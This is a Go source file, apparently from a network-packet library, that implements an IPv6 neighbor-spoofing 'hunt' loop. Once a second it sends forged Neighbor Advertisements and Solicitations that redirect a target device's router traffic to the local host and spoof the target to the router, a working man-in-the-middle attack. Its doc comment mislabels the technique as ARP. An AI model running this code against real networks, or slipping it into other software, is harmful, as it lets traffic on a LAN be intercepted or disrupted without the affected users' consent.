package icmp6

import (
	"fmt"
	"time"

	"github.com/irai/packet"
)

// StartHunt implements packet processor interface
//
// Hunt IPv6 LLA only; return error if IP is not IP6 Local Link Address
func (h *Handler) StartHunt(addr packet.Addr) (packet.HuntStage, error) {
	if Debug {
		fmt.Printf("icmp6 : start neighbor hunt %s\n", addr)
	}
	if !addr.IP.IsLinkLocalUnicast() {
		return packet.StageNoChange, packet.ErrInvalidIP6LLA
	}
	h.Lock()
	if h.huntList.Index(addr.MAC) != -1 {
		h.Unlock()
		return packet.StageHunt, nil
	}
	h.huntList.Add(addr)
	h.Unlock()

	// only interested in LLA
	if addr.IP.IsLinkLocalUnicast() {
		go h.spoofLoop(addr)
	}

	return packet.StageHunt, nil
}

// StopHunt implements PacketProcessor interface
func (h *Handler) StopHunt(addr packet.Addr) (packet.HuntStage, error) {
	if Debug {
		fmt.Printf("icmp6 : stop neighbor hunt %s\n", addr)
	}
	h.Lock()
	defer h.Unlock()

	h.huntList.Del(addr)
	return packet.StageNormal, nil
}

// spoofLoop attacks the client with ARP attacks
//
// It will continuously send a number of ARP packets to client:
//   1. spoof the client arp table to send router packets to us
//   2. optionally, claim the ownership of the IP to force client to change IP or go offline
//
func (h *Handler) spoofLoop(dstAddr packet.Addr) {
	// Tplink home router send RA every 3 seconds
	// 1 second re-do seem to be adequate;
	ticker := time.NewTicker(time.Second * 1).C
	startTime := time.Now()
	nTimes := 0
	fmt.Printf("icmp6 : na attack ip=%s time=%v\n", dstAddr.IP, startTime)
	for {
		h.Lock()

		if h.huntList.Index(dstAddr.MAC) == -1 || h.closed {
			h.Unlock()
			fmt.Printf("icmp6 : attack end ip=%s repeat=%v duration=%v\n", dstAddr.IP, nTimes, time.Since(startTime))
			return
		}

		// Attack when we have the router LLA only
		if h.Router != nil {
			list := []packet.Addr{}
			for _, router := range h.LANRouters {
				list = append(list, router.Addr)
			}

			h.Unlock()

			for _, routerAddr := range list {
				// spoof host
				//
				host := packet.Addr{MAC: h.session.NICInfo.HostMAC, IP: h.session.NICInfo.HostLLA.IP}
				targetAddr := packet.Addr{MAC: h.session.NICInfo.HostMAC, IP: routerAddr.IP}
				fakeRouter := packet.Addr{MAC: host.MAC, IP: routerAddr.IP}
				if err := h.SendNeighborAdvertisement(fakeRouter, dstAddr, targetAddr); err != nil {
					fmt.Println("icmp6 : error sending na ", err)
				}
				if err := h.SendNeighbourSolicitation(fakeRouter, dstAddr, dstAddr.IP); err != nil {
					fmt.Println("icmp6 : error sending na ", err)
				}

				if nTimes%16 == 0 {
					fmt.Printf("icmp6 : attack src %s dst %s target %s repeat=%v duration=%v\n", host, dstAddr, targetAddr, nTimes, time.Since(startTime))
				}
				nTimes++

				// spoof router
				targetAddr.IP = dstAddr.IP
				if err := h.SendNeighborAdvertisement(host, routerAddr, targetAddr); err != nil {
					fmt.Println("icmp6 : error sending na ", err)
				}
			}
		} else {
			h.Unlock()
			if nTimes%64 == 0 {
				fmt.Printf("icmp6 : na attack failed - missing router LLA %s\n", dstAddr)
			}
			nTimes++
		}

		select {
		case <-h.closeChan:
		case <-ticker:
		}
	}
}
